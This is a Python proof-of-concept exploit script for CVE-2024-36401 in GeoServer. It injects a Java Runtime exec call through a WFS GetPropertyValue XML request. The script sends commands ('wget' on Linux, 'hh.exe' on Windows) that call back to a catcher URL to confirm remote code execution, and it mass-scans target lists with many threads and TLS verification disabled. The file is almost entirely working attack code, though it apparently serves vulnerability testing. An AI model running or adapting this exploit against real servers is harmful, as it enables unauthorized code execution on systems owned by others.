#!/usr/bin/python3

import argparse
import os
import random
import re
import time
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

COLORS = {
    "dim_yellow": "\033[33;1m",
    "green": "\033[92m",
    "red": "\033[31m",
    "cyan": "\033[96m",
    "reset": "\033[0m",
}


def print_message(level, message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    color = COLORS.get(
        {"info": "green", "warning": "dim_yellow", "success": "cyan"}.get(level, "red"),
        COLORS["red"],
    )
    print(f"{current_time} {color}[{level.upper()}]{COLORS['reset']} {message}")


def clean_host(url):
    parsed_url = urlparse(url)
    host = parsed_url.netloc or parsed_url.path
    return re.sub(r"^www\.|/$", "", host)


class GeoServerExploit:
    def __init__(self, url, catcher):
        self.url = url
        self.type = None
        self.host = clean_host(url)
        self.catcher = catcher

    @staticmethod
    def parse_xml_and_get_random_feature_type(self):
        full_url = f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0"
        try:
            response = requests.get(full_url)
            response.raise_for_status()
            xml_string = response.text
        except requests.RequestException as e:
            print(f"Error fetching XML from URL: {e}")
            return None

        namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
        try:
            root = ET.fromstring(xml_string)
        except ET.ParseError as e:
            print(f"Error parsing XML: {e}")
            return None

        feature_types = root.findall(".//wfs:ReturnFeatureType", namespaces)

        feature_type_values = [ft.text for ft in feature_types]

        type = random.choice(feature_type_values) if feature_type_values else None

        print_message(
            "info", f"Gathered feature type from {self.url}: {type if type else 'None'}"
        )
        return type

    def _create_payload(self, payload):
        self.type = self.parse_xml_and_get_random_feature_type(self)
        return f"""<wfs:GetPropertyValue service='WFS' version='2.0.0'
                 xmlns:topp='http://www.openplans.org/topp'
                 xmlns:fes='http://www.opengis.net/fes/2.0'
                 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
                  <wfs:Query typeNames='{self.type}'/>
                  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'{payload}')</wfs:valueReference>
                </wfs:GetPropertyValue>"""

    def send_poc_request(self):
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Host": self.host,
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/xml",
        }

        payloads = {
            "linux": self._create_payload(
                payload=f"wget {self.catcher}/{self.host} -q"
            ),
            "windows": self._create_payload(payload=f"hh.exe {self.catcher}"),
        }

        for os_type, payload in payloads.items():
            try:
                response = requests.post(
                    full_url, headers=headers, data=payload, timeout=30, verify=False
                )
                print_message(
                    "info",
                    f"Response status code for {self.url} ({os_type}): {COLORS['dim_yellow']}{response.status_code}{COLORS['reset']}\nResponse text: {response.text}",
                )
                if response.status_code in [401, 404, 403]:
                    print_message(
                        "info",
                        f"Target {self.url} is not vulnerable.",
                    )
                elif response.status_code in [500]:
                    print_message(
                        "info",
                        f"Target {self.url} is not vulnerable to {os_type} payload.",
                    )
                else:
                    print_message(
                        "success",
                        f"Target {self.url} might be vulnerable to {os_type} payload.",
                    )
            except requests.exceptions.RequestException as e:
                print_message(
                    "error", f"An error occurred for {self.url} ({os_type}): {e}"
                )
                print_message(
                    "error", f"Failed to send {os_type} request to {self.url}!"
                )

        return False


def parse_arguments():
    parser = argparse.ArgumentParser(description="POC for CVE-2024-36401")
    parser.add_argument(
        "-u", required=True, help="Target URL or file containing newline-delimited URLs"
    )
    parser.add_argument(
        "-t", type=int, default=100, help="Number of threads (default: 10)"
    )
    parser.add_argument(
        "-c",
        "--catcher",
        default="http://127.0.0.1:8000/log",
        help="Catcher URL (default: http://127.0.0.1:8000/log)",
    )
    return parser.parse_args()


def process_url(url, catcher):
    print_message("info", f"Processing target: {url}")
    exploit = GeoServerExploit(url, catcher)
    time.sleep(1)
    return exploit.send_poc_request()


def main():
    args = parse_arguments()

    if os.path.isfile(args.u):
        with open(args.u, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
    else:
        urls = [args.u]

    with ThreadPoolExecutor(max_workers=args.t) as executor:
        futures = [executor.submit(process_url, url, args.catcher) for url in urls]

        for future in as_completed(futures):
            future.result()


if __name__ == "__main__":
    main()
